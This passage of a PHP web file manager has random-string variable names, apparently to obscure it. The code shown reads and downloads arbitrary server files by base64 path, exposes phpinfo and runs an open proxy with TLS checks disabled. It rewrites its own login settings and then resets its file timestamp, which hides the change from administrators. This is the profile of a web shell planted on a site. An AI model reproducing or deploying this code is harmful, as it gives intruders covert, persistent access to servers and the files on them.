<input type="hidden" value="'.$lng_tpl.'" name="tpl_edited">
<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
'.$str.'
<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.fm_url().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">
<input type="hidden" value="'.$lng_tpl.'" name="tpl_edited">
<tr><td class="row1"><input name="'.$lng_tpl.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$lng_tpl.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>
</table>
';
}

function find_text_in_files($dir, $mask, $text) {
    $results = array();
    if ($mypduratbnjskfzcqvhgew = opendir($dir)) {
        while (false !== ($entry = readdir($mypduratbnjskfzcqvhgew))) {
            if ($entry != "." && $entry != "..") {
                $rgvxhjbkznwpescmudqfyt = $dir . "/" . $entry;
                if (is_dir($rgvxhjbkznwpescmudqfyt)) {
                    $results = array_merge($results, find_text_in_files($rgvxhjbkznwpescmudqfyt, $mask, $text));
                } else {
                    if (fnmatch($mask, $entry)) {
                        $contents = file_get_contents($rgvxhjbkznwpescmudqfyt);
                        if (strpos($contents, $text) !== false) {
                            $results[] = str_replace('//', '/', $rgvxhjbkznwpescmudqfyt);
                        }
                    }
                }
            }
        }
        closedir($mypduratbnjskfzcqvhgew);
    }
    return $results;
}


/* End Functions */

// authorization
if ($dbevfpwzjxrqtymuhgscan['authorize']) {
	if (isset($_POST['login']) && isset($_POST['password'])){
		if (($_POST['login']==$dbevfpwzjxrqtymuhgscan['login']) && ($_POST['password']==$dbevfpwzjxrqtymuhgscan['password'])) {
			setcookie($dbevfpwzjxrqtymuhgscan['cookie_name'], $dbevfpwzjxrqtymuhgscan['login'].'|'.md5($dbevfpwzjxrqtymuhgscan['password']), time() + (86400 * $dbevfpwzjxrqtymuhgscan['days_authorization']));
			$_COOKIE[$dbevfpwzjxrqtymuhgscan['cookie_name']]=$dbevfpwzjxrqtymuhgscan['login'].'|'.md5($dbevfpwzjxrqtymuhgscan['password']);
		}
	}
	if (!isset($_COOKIE[$dbevfpwzjxrqtymuhgscan['cookie_name']]) OR ($_COOKIE[$dbevfpwzjxrqtymuhgscan['cookie_name']]!=$dbevfpwzjxrqtymuhgscan['login'].'|'.md5($dbevfpwzjxrqtymuhgscan['password']))) {
		echo '
<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>'.__('File manager').'</title>
</head>
<body>
<form action="" method="post">
'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;
<input type="submit" value="'.__('Enter').'" class="fm_input">
</form>
'.fm_lang_form($fvyhagtnscbjqmrzkwpuxe).'
</body>
</html>
';  
die();
	}
	if (isset($_POST['quit'])) {
		unset($_COOKIE[$dbevfpwzjxrqtymuhgscan['cookie_name']]);
		setcookie($dbevfpwzjxrqtymuhgscan['cookie_name'], '', time() - (86400 * $dbevfpwzjxrqtymuhgscan['days_authorization']));
		header('Location: '.fm_site_url().$_SERVER['REQUEST_URI']);
	}
}

// Change config
if (isset($_GET['fm_settings'])) {
	if (isset($_GET['fm_config_delete'])) { 
		unset($_COOKIE['fm_config']);
		setcookie('fm_config', '', time() - (86400 * $dbevfpwzjxrqtymuhgscan['days_authorization']));
		header('Location: '.fm_url().'?fm_settings=true');
		exit(0);
	}	elseif (isset($_POST['fm_config'])) { 
		$qdsbknxmygjctfzpravewh = $_POST['fm_config'];
		setcookie('fm_config', serialize($qdsbknxmygjctfzpravewh), time() + (86400 * $dbevfpwzjxrqtymuhgscan['days_authorization']));
		$_COOKIE['fm_config'] = serialize($qdsbknxmygjctfzpravewh);
		$qwgdrjtkzvafsecpunxbhy = __('Settings').' '.__('done');
	}	elseif (isset($_POST['fm_login'])) { 
		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];
		$fm_login = json_encode($_POST['fm_login']);
		$pcjgseykbdnrzvmwaxutqf = file_get_contents(__FILE__);
		$umtnvpxewrfhdkjasgzcyb = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $pcjgseykbdnrzvmwaxutqf, $matches);
		if (!empty($matches[1])) {
			$pbzwqxnsguyvdrmhtkcfae = filemtime(__FILE__);
			$aygjbpnhetfwdmrkucxvqz = str_replace('{"'.$matches[1].'"}',$fm_login,$pcjgseykbdnrzvmwaxutqf);
			if (file_put_contents(__FILE__, $aygjbpnhetfwdmrkucxvqz)) {
				$qwgdrjtkzvafsecpunxbhy .= __('File updated');
				if ($_POST['fm_login']['login'] != $dbevfpwzjxrqtymuhgscan['login']) $qwgdrjtkzvafsecpunxbhy .= ' '.__('Login').': '.$_POST['fm_login']['login'];
				if ($_POST['fm_login']['password'] != $dbevfpwzjxrqtymuhgscan['password']) $qwgdrjtkzvafsecpunxbhy .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$dbevfpwzjxrqtymuhgscan = $_POST['fm_login'];
			}
			else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
			if (!empty($qdsbknxmygjctfzpravewh['fm_restore_time'])) touch(__FILE__,$pbzwqxnsguyvdrmhtkcfae);
		}
	} elseif (isset($_POST['tpl_edited'])) { 
		$lng_tpl = $_POST['tpl_edited'];
		if (!empty($_POST[$lng_tpl.'_name'])) {
			$fm_php = json_encode(array_combine($_POST[$lng_tpl.'_name'],$_POST[$lng_tpl.'_value']),JSON_HEX_APOS);
		} elseif (!empty($_POST[$lng_tpl.'_new_name'])) {
			$fm_php = json_encode(json_decode(${$lng_tpl.'_templates'},true)+array($_POST[$lng_tpl.'_new_name']=>$_POST[$lng_tpl.'_new_value']),JSON_HEX_APOS);
		}
		if (!empty($fm_php)) {
			$pcjgseykbdnrzvmwaxutqf = file_get_contents(__FILE__);
			$umtnvpxewrfhdkjasgzcyb = preg_match('#'.$lng_tpl.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $pcjgseykbdnrzvmwaxutqf, $matches);
			if (!empty($matches[1])) {
				$pbzwqxnsguyvdrmhtkcfae = filemtime(__FILE__);
				$aygjbpnhetfwdmrkucxvqz = str_replace('{"'.$matches[1].'"}',$fm_php,$pcjgseykbdnrzvmwaxutqf);
				if (file_put_contents(__FILE__, $aygjbpnhetfwdmrkucxvqz)) {
					${$lng_tpl.'_templates'} = $fm_php;
					$qwgdrjtkzvafsecpunxbhy .= __('File updated');
				} else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
				if (!empty($qdsbknxmygjctfzpravewh['fm_restore_time'])) touch(__FILE__,$pbzwqxnsguyvdrmhtkcfae);
			}	
		} else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
	}
}

// Just show image
if (isset($_GET['img'])) {
	$wjvdmrgebyxuqaknzshpct=base64_decode($_GET['img']);
	if ($hkcurapygqmjszetnwdfbx=getimagesize($wjvdmrgebyxuqaknzshpct)){
		switch  ($hkcurapygqmjszetnwdfbx[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP
			case 1: $ext='gif'; break;
			case 2: $ext='jpeg'; break;
			case 3: $ext='png'; break;
			case 6: $ext='bmp'; break;
			default: die();
		}
		header("Content-type: image/$ext");
		echo file_get_contents($wjvdmrgebyxuqaknzshpct);
		die();
	}
}

// Just download file
if (isset($_GET['download'])) {
	$wjvdmrgebyxuqaknzshpct=base64_decode($_GET['download']);
	fm_download($wjvdmrgebyxuqaknzshpct);	
}

// Just show info
if (isset($_GET['phpinfo'])) {
	phpinfo(); 
	die();
}

// Mini proxy, many bugs!
if (isset($_GET['proxy']) && (!empty($qdsbknxmygjctfzpravewh['enable_proxy']))) {
	$url = isset($_GET['url'])?urldecode($_GET['url']):'';
	$proxy_form = '
<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">
	'.fm_home().' <a href="'.$url.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$url.'" size="55">
	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>
</div>
';
	if ($url) {
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Den1xxx test proxy');
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_REFERER, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
		$dkcmjwtqnsvhzgaupbxfry = curl_exec($ch);
		curl_close($ch);
		//$dkcmjwtqnsvhzgaupbxfry = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$url.'/\\2"', $dkcmjwtqnsvhzgaupbxfry);
		$dkcmjwtqnsvhzgaupbxfry = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'fm_url_proxy', $dkcmjwtqnsvhzgaupbxfry);
		$dkcmjwtqnsvhzgaupbxfry = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.fm_home_style().'</style>'.$proxy_form, $dkcmjwtqnsvhzgaupbxfry);
		echo $dkcmjwtqnsvhzgaupbxfry;
		die();
	} 
}
?>
<!doctype html>
<html>
<head>     
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?=__('File manager')?></title>
<style>
body {
	background-color:	white;
	font-family:		Verdana, Arial, Helvetica, sans-serif;
	font-size:			8pt;
	margin:				0px;
}

a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }
a.th:link { color: #FFA34F; text-decoration: none; }
a.th:active { color: #FFA34F; text-decoration: none; }
a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }

table.bg {
	background-color: #ACBBC6
}

th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;
	padding: 3px;
}

th	{
	height:				25px;
	background-color:	#006699;
	color:				#FFA34F;
	font-weight:		bold;
	font-size:			11px;
}

.row1 {
	background-color:	#EFEFEF;
}

.row2 {
	background-color:	#DEE3E7;
}

.row3 {
	background-color:	#D1D7DC;
	padding: 5px;
}

tr.row1:hover {
	background-color:	#F3FCFC;
}

tr.row2:hover {
	background-color:	#F0F6F6;
}

.whole {
	width: 100%;
}

.all tbody td:first-child{width:100%;}

textarea {
	font: 9pt 'Courier New', courier;
	line-height: 125%;
	padding: 5px;
}

.textarea_input {
	height: 1em;
}

.textarea_input:focus {
	height: auto;
}

input[type=submit]{
	background: #FCFCFC none !important;
	cursor: pointer;
}

.folder {
    background-image: url("data:image/png;base64,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");
}

.file {
    background-image: url("data:image/png;base64,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");
}
<?=fm_home_style()?>
.img {
	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
